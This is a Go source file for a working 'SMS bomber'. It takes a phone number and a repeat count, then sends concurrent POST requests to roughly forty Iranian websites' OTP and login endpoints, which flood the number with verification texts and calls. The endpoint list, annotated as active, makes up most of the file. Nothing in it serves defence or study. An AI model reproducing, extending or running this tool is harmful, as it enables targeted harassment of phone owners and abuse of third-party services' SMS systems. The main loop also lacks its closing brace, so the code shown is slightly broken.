package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
)

// clearScreen clears the terminal screen based on the operating system.
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// sendJSONRequest sends an HTTP POST request with a JSON payload.
// It uses a context for cancellation, a WaitGroup for synchronization,
// and a channel to report only the HTTP status code.
func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	// wg.Done() should be deferred here to ensure it's called even if errors occur
	defer wg.Done()

	jsonData, err := json.Marshal(payload)
	if err != nil {
		// Use error color for encoding errors
		fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m")
		ch <- http.StatusInternalServerError // Report a standard error status code
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		// Use error color for request creation errors
		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
		ch <- http.StatusInternalServerError // Report a standard error status code
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		// Check if the error is due to context cancellation
		if ctx.Err() == context.Canceled {
			// Use a distinct color/message for cancellation
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0 // Report a specific code for cancellation (or handle differently if needed)
			return
		}
		// Use error color for other request errors
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- http.StatusInternalServerError // Report a standard error status code for other errors
		return
	}
	defer resp.Body.Close()

	// Report only the HTTP status code
	ch <- resp.StatusCode
}

// sendFormRequest sends an HTTP POST request with a form-urlencoded payload.
// It uses a context for cancellation, a WaitGroup for synchronization,
// and a channel to report only the HTTP status code.
func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	// wg.Done() should be deferred here to ensure it's called even if errors occur
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
	if err != nil {
		// Use error color for request creation errors
		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err)
		ch <- http.StatusInternalServerError // Report a standard error status code
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		// Check if the error is due to context cancellation
		if ctx.Err() == context.Canceled {
			// Use a distinct color/message for cancellation
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- 0 // Report a specific code for cancellation (or handle differently if needed)
			return
		}
		// Use error color for other request errors
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- http.StatusInternalServerError // Report a standard error status code for other errors
		return
	}
	defer resp.Body.Close()

	// Report only the HTTP status code
	ch <- resp.StatusCode
}

func main() {
	clearScreen()

	// --- ASCII Banner with Colors ---
	fmt.Print("\033[01;32m") // Top (green)
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m") // Middle (white)
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m") // Bottom (red)
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m") // Reset color
	// --- End of ASCII Banner ---

	// Service introduction messages and input prompts (like smstest.go)
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	// Setup context for cancellation and signal handling for graceful shutdown (Ctrl+C)
	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		// Use error-like color for interrupt message
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel() // Cancel the context
	}()

	var wg sync.WaitGroup
	// Create a buffered channel to receive integer status codes.
	// Buffer size should be large enough to not block goroutines immediately.
	// A safe bet is the total number of potential requests (repeatCount * number of APIs).
	ch := make(chan int, repeatCount*40) 

	// Loop to send requests concurrently
	for i := 0; i < repeatCount; i++ {
		// core.gapfilm.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
			"PhoneNo": phone,
		}, &wg, ch)  // active ✅
		// api.pindo.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// divar.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// shab.ir login-otp (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// shab.ir enter-mobile (JSON - adjusted payload format)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
			"mobile": phone, // Assuming the intent was {"mobile": "phone_number", "country_code": "+98"}
			"country_code": "+98",
		}, &wg, ch)  // active ✅
		// Original Mobinnet JSON request (kept for reference/comparison)
		 wg.Add(1)
		 go func(p string) {
		 	sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
		 }(phone)  // active ✅
		// api.ostadkr.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.ostadkr.com/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// digikalajet.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// iranicard.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// alopeyk.com sms/send.php (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// alopeyk.com safir-service (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// pinket.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)  // active ✅
		// otaghak.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
			"username": phone,
		}, &wg, ch)  // active ✅
		// banimode.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// gw.jabama.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// taraazws.jabama.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// api.torobpay.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)  // active ✅
		// sheypoor.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
			"username": phone,
		}, &wg, ch)  // active ✅
		// miare.ir driver request (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)  // active ✅
		// api.pezeshket.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
			"mobileNumber": phone,
		}, &wg, ch)  // active ✅
		// app.classino.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// snapp.taxi (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)  // active ✅
		// api.snapp.ir sms/link (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// api.snapp.market loginMobileWithNoPass (JSON) - Corrected URL with query params and JSON payload
		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)  // active ✅

		// digikala.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
			"username": phone,
		}, &wg, ch)  // active ✅
		// ponisha.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// api.bitycle.com register (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)  // active ✅
		// uiapi2.saapa.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// api.komodaa.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)  // active ✅
		// khodro45.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// ssr.anargift.com auth (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅

		// ssr.anargift.com auth/send_code (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)  // active ✅
		// digitalsignup.snapp.ir otp (JSON) - Corrected URL with query params and JSON payload
		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)  // active ✅
		// digitalsignup.snapp.ir drivers/api/v1/otp (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)  // active ✅
		// Original Snappfood form request (kept for reference/comparison)
		 wg.Add(1)
		 go func(p string) {
		 	formData := url.Values{}
		 	formData.Set("cellphone", p)
		 	sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
		 }(phone)  // active ✅
// nobat.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.nobat.ir/patient/login/phone", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// api.sibbank.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)
		// sandbox.sibirani.ir invite (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		// sandbox.sibirani.com generator-inv-token (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
			"username": phone,
		}, &wg, ch)		
// tap33.me v2/user (JSON - adjusted payload format)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://tap33.me/api/v2/user", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)


	// Goroutine to wait for all requests to complete and then close the channel.
	go func() {
		wg.Wait() // Wait for all Goroutines in the WaitGroup to finish
		close(ch) // Close the channel when all Goroutines are done
	}()

	// Read integer status codes from the channel until it is closed and print messages
	// similar to smstest.go's output.
	for statusCode := range ch {
		// Added a check for status code 0 which we used for cancellation
		if statusCode >= 400 || statusCode == 0 { // Treat any 4xx or 5xx as an error, plus our cancellation code 0
			fmt.Println("\033[01;31m[-] Error ! ") // Error message format from smstest.go
		} else { // Assume 2xx and 3xx are successful or redirects (treated as success for this purpose)
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended") // Success message format from smstest.go
		}
	}

	// The final "All requests processed." message is still omitted to match smstest.go style.
}
